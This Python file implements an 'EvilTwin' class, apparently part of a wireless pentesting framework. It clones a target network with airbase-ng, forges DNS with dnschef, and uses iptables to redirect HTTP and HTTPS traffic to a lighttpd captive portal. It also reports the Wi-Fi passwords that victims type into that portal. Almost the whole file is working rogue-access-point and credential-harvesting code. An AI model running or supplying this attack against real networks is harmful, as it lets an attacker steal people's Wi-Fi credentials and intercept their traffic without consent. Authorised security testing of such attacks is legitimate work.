
import sys
import time
import traceback
from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
import subprocess as sb
from threading import Thread
import tempfile
import Model.utils as utl

class EvilTwin(AbstractAttack):
    AIRBASE_MESSAGE = 'airbase-ng'
    DNSCHEF_MESSAGE = 'dnschef'
    LIGHTTPD_MESSAGE = 'lighttpd'

    PROCESS_NAMES = [AIRBASE_MESSAGE, DNSCHEF_MESSAGE, LIGHTTPD_MESSAGE]

    PASSWORDS_FILE = tempfile.gettempdir() + "/et_attempts.txt"
    TIMEOUT = sys.maxsize #infinite

    @classmethod
    def attack_name(cls) -> str:
        return 'Evil twin captive portal'

    @classmethod
    def description(cls, result: bool):
        with open(cls.PASSWORDS_FILE, "r") as f:
            pass_found = f.read()

        desc = ""
        if result:
            desc = "Evil twin has captured these paswords: " + pass_found
        else:
            desc += "Evil twin has captured these paswords: " + pass_found
        return desc

    @classmethod
    def execute_attack(cls, q, kwargs) -> bool:
        utl.delete_file(cls.PASSWORDS_FILE)
        target = kwargs['target']
        interface = kwargs['interface']

        cmd = ['killall', 'dhcpd']
        sb.run(cmd)

        airbase_t = Thread(daemon=True, target=cls.create_AP, args=(q, target, interface))
        dnschef_t = Thread(daemon=True, target=cls.init_dnschef, args=(q, ))
        lighttpd_t = Thread(daemon=True, target=cls.init_lighttpd, args=(q,))

        airbase_t.start()
        time.sleep(2)

        cls.set_up_at0()
        time.sleep(2)

        cls.set_iptables()
        time.sleep(2)

        cls.init_dhcpd()
        dnschef_t.start()
        lighttpd_t.start()

        file_position = 0
        try:
            while True:
                time.sleep(2)
                with open(cls.PASSWORDS_FILE, 'a+') as f:
                    f.seek(file_position)  # fast forward beyond content read previously
                    for line in f:
                        if line == 'EOF\n':
                            raise Exception('EOF')
                        q.put('Password attempt captured!\n')
                        q.put(line)

                    file_position = f.tell()  # store position at which to resume
        except:
            result = AttackResultInfo()
            result.attack = cls.attack_name()
            result.risk = 'Medium'
            result.desc = cls.description(True)
            q.put(result)                    


    @classmethod
    def create_AP(cls, q, target, interface):
        cmd = ['airbase-ng', '-e', target.essid, '-c', str(target.channel), interface.monitor]
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, text=True)

        with open(utl.pids_file, "a") as f:
            f.write(str(p.pid) + "\n")

        for line in p.stdout:
            q.put((cls.AIRBASE_MESSAGE, line))

    @classmethod
    def set_up_at0(cls):
        cmd = ["ifconfig at0 up; ifconfig at0 192.169.1.1 netmask 255.255.255.0;" + 
        "route add -net 192.169.1.0 netmask 255.255.255.0 gw 192.169.1.1"]
        sb.run(cmd, shell=True)

    @classmethod
    def set_iptables(cls):
        cmd = ["iptables --flush;" + 
        "echo 1 > /proc/sys/net/ipv4/ip_forward;" +
        "iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.169.1.1;" +
        "iptables -P FORWARD ACCEPT;" +
        "iptables --append FORWARD --in-interface at0 -j ACCEPT;" +
        "iptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE;" +
        "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80;" +
        "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80;"]

        sb.run(cmd, shell=True)

    @classmethod
    def init_dhcpd(cls):
        cmd = ['dhcpd -cf Model/files/dhcpd.conf']
        p = sb.run(cmd, shell=True)

    @classmethod
    def init_dnschef(cls, q):
        cmd = ["dnschef", "--interface", "192.169.1.1", "--fakeip", "192.169.1.1"]
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, stderr=sb.PIPE, text=True)

        with open(utl.pids_file, "a") as f:
            f.write(str(p.pid) + "\n")

        for line in p.stderr:
            q.put((cls.DNSCHEF_MESSAGE, line))

        for line in p.stdout:
            q.put((cls.DNSCHEF_MESSAGE, line))


    @classmethod
    def init_lighttpd(cls, q):
        cmd = ["lighttpd", "-D", "-f", "Model/files/ag.lighttpd.conf"]
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, stderr=sb.PIPE, text=True)

        with open(utl.pids_file, "a") as f:
            f.write(str(p.pid) + "\n")

        for line in p.stderr:
            q.put((cls.LIGHTTPD_MESSAGE, line))
        for line in p.stdout:
            q.put((cls.LIGHTTPD_MESSAGE, line))
        
        with open(cls.PASSWORDS_FILE, "a") as f:
            f.write('EOF\n')
